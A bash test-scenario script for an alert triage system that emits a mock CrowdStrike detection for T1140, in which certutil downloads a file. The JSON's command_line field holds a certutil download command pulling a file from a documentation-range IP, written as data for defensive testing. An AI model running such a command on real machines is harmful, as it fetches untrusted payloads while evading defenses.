#!/usr/bin/env bash
# =============================================================================
# Scenario: Suspicious - certutil download
# =============================================================================
# MITRE ATT&CK: T1140
# Tactic:     Defense Evasion
# Severity:   MEDIUM (vendor-reported; Vyrox re-triages independently)
#
# certutil used to pull a file from an external IP - a common LOLBin download, but also used legitimately.
#
# Expected Vyrox verdict: MEDIUM (ambiguous -> LLM tier classifies; degraded fallback is also MEDIUM).
# =============================================================================

SCENARIO_NAME="medium_certutil"
SCENARIO_SOURCE="crowdstrike"
SCENARIO_SEVERITY="MEDIUM"
SCENARIO_TACTIC="Defense Evasion"
SCENARIO_TECHNIQUE="T1140"

# Unique per fire (timestamp + random): the pipeline dedupes on
# (tenant, source, raw_id), so a per-second id would collapse rapid back-to-back
# fires of the same scenario into one alert. The random suffix keeps each fire a
# distinct detection, the way a real EDR assigns a fresh detect_id each time.
TIMESTAMP=$(date +%s)
DETECT_ID="cs-${TIMESTAMP}-${RANDOM}${RANDOM}"

# build_payload - emit the CrowdStrike-format detection JSON for this scenario.
# Args: $1 tenant_id (default "default-tenant").
build_payload() {
    local tenant_id="${1:-default-tenant}"
    cat <<EOF
{
    "detect_id": "${DETECT_ID}",
    "customer_id": "${tenant_id}",
    "timestamp": ${TIMESTAMP},
    "sensor": {
        "hostname": "win-workstation-21"
    },
    "process": {
        "user_name": "CORP\\\\akhan",
        "file_name": "certutil.exe",
        "command_line": "certutil -urlcache -split -f http://198.51.100.20/p.dat C:/Users/Public/p.dat",
        "sha256": "5555555555555555555555555555555555555555555555555555555555555555"
    },
    "tactic": "${SCENARIO_TACTIC}",
    "technique": "${SCENARIO_TECHNIQUE}",
    "severity": "${SCENARIO_SEVERITY}"
}
EOF
}
